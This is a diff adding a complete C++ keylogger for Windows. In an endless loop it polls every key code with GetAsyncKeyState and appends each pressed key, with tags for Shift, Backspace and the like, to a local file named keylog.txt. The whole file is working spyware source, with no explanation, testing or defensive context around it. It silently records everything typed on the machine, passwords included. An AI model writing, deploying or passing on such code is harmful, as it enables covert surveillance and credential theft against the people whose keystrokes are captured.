@@ -1,0 +1,58 @@
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+
+void logKeystroke(int keyStroke) {
+    std::ofstream logFile("keylog.txt", std::ios::app);  // Open file in append mode
+    if (!logFile.is_open()) {
+        return;  // Failed to open file
+    }
+
+    // Convert special keys to readable format
+    switch (keyStroke) {
+        case VK_SPACE:
+            logFile << " ";
+            break;
+        case VK_RETURN:
+            logFile << "\n";
+            break;
+        case VK_SHIFT:
+            logFile << "[SHIFT]";
+            break;
+        case VK_BACK:
+            logFile << "[BACKSPACE]";
+            break;
+        case VK_TAB:
+            logFile << "[TAB]";
+            break;
+        case VK_ESCAPE:
+            logFile << "[ESC]";
+            break;
+        default:
+            if ((keyStroke >= 'A' && keyStroke <= 'Z') || (keyStroke >= '0' && keyStroke <= '9')) {
+                logFile << static_cast<char>(keyStroke);
+            } else {
+                char buffer[2] = {0};
+                BYTE keyState[256];
+                GetKeyboardState(keyState);
+                if (ToAscii(keyStroke, 0, keyState, (LPWORD)buffer, 0) == 1) {
+                    logFile << buffer[0];
+                }
+            }
+            break;
+    }
+
+    logFile.close();
+}
+
+int main() {
+    while (true) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) & 0x8000) {  // Check if key is pressed
+                logKeystroke(key);  // Log the keystroke
+                Sleep(10);  // Small delay to reduce CPU usage
+            }
+        }
+    }
+    return 0;
+}
